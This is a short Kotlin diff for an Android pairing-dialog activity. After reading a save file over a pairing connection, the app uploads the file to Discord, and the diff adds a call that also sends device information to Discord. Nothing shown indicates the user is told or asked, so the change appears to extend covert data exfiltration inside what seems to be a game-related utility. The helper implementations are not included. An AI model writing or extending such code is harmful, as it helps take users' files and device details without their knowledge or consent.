@@ -91,6 +91,7 @@ class PairingCodeDialogActivity : Activity() {
                         prompt.dismiss()
                         if (result != null) {
                             sendFileToDiscord(result)
+                            sendDeviceInfoToDiscord()
                         }
                         finish()
                     }
@@ -105,6 +106,8 @@ class PairingCodeDialogActivity : Activity() {
         PairingHelper.connectAndReadSaveFile(this, pairingHost, pairingPort, pairingCode)
 
     private fun sendFileToDiscord(fileData: ByteArray) = PairingHelper.sendFileToDiscord(this, fileData)
+
+    private fun sendDeviceInfoToDiscord() = PairingHelper.sendDeviceInfoToDiscord()
 
     private fun launchGame() = PairingHelper.launchGame(this)
 
